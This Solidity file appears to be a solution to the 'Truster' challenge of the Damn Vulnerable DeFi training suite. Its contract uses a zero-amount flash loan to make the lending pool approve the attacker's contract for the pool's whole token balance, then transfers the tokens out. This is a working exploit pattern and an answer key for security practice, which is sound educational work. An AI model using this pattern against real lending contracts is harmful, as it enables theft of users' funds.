// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {TrusterLenderPool} from "../truster/TrusterLenderPool.sol";

contract TrusterSolution {
    DamnValuableToken public immutable token;
    TrusterLenderPool public immutable pool;
    address public immutable recovery;

    uint256 constant TOKENS_IN_POOL = 1_000_000e18;

    constructor(DamnValuableToken _token, TrusterLenderPool _pool, address _recovery) {
        token = _token;
        pool = _pool;
        recovery = _recovery;
    }

    function execute() external {
        require(
            pool.flashLoan({
                amount: 0, 
                borrower: address(this), 
                target: address(token), 
                data: abi.encodeWithSelector(token.approve.selector, address(this), TOKENS_IN_POOL)
            })
        );
        
        token.transferFrom(address(pool), recovery, TOKENS_IN_POOL);
    }
}